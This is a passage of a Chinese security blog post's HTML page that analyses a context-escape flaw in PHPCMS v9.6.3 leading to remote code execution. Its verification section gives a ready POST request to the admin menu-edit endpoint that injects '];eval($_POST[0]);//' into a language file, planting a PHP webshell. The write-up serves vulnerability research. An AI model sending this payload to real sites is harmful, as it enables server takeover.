+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$LANG</span><span class="o">[</span><span class="s1">&#39;]1//&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;]1//\&#39;&#39; -&gt; $LANG[&#39;</span>1//<span class="se">\&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;]1//\&#39;</span><span class="err">&#39;</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>那么 1 就逃逸出来了！我们只需要将 1 换为危险的 php 木马即可完成 RCE 利用</p>
+<h1 class="heading-element" id="漏洞验证"><span>漏洞验证</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e9%aa%8c%e8%af%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>首先登录后台，拿到认证凭证，否则类文件都访问不了就弹警告了
+然后发包</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/index.php?m=admin&amp;c=menu&amp;a=edit&amp;pc_hash=tigdXO&amp;id=1
+</span></span><span class="line"><span class="cl">POST：dosubmit=1&amp;info[name]=];eval($_POST[0]);//&amp;language=];eval($_POST[0]);//&#39;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250802224420500.png" alt="" loading="lazy"></figure>
+
+再发
+<figure>
+  <img src="file-20250802224436192.png" alt="" loading="lazy"></figure>
+
+完成漏洞利用
+<figure>
+  <img src="file-20250802224541558.png" alt="" loading="lazy"></figure>
+</p>
+<p>PS. 虽然 PHPCMS 系列结束了，但 PHP 安全研究才刚刚开始，PHP 作为安全问题无穷无尽的语言，还有太多等着探索</p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/code-audit/" class="post-footer-tag-link" title="Tags - Code Audit">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>Code Audit</span>
+          </a>
+        </li><li class="post-footer-tag-item">
+          <a href="/tags/context-escape/" class="post-footer-tag-link" title="Tags - Context Escape">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>Context Escape</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/%E6%B5%85%E6%9E%90-phpcmsv9-6-3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4rce/" data-title="浅析 PHPCMSv9.6.3 上下文逃逸导致RCE" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="Code Audit,Context Escape"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/%E6%B5%85%E6%9E%90-phpcmsv9-6-3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4rce/" data-hashtag="Code Audit"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/%E6%B5%85%E6%9E%90-phpcmsv9-6-3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4rce/" data-title="浅析 PHPCMSv9.6.3 上下文逃逸导致RCE"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/phpcms-v9-6-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-footer-nav-prev" rel="prev">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">PHPCMSv9.6.3 文件包含漏洞分析</div>
+          </div>
+        </a><a href="/posts/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2025-web-writeup/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">第十届 “磐石行动” 初赛 2025 Web Writeup</div>
+          </div>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#php-特性">PHP 特性</a></li>
+    <li><a href="#代码审计">代码审计</a></li>
+    <li><a href="#漏洞验证">漏洞验证</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/fa91bd4afe91c13184943b38a66336bd.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
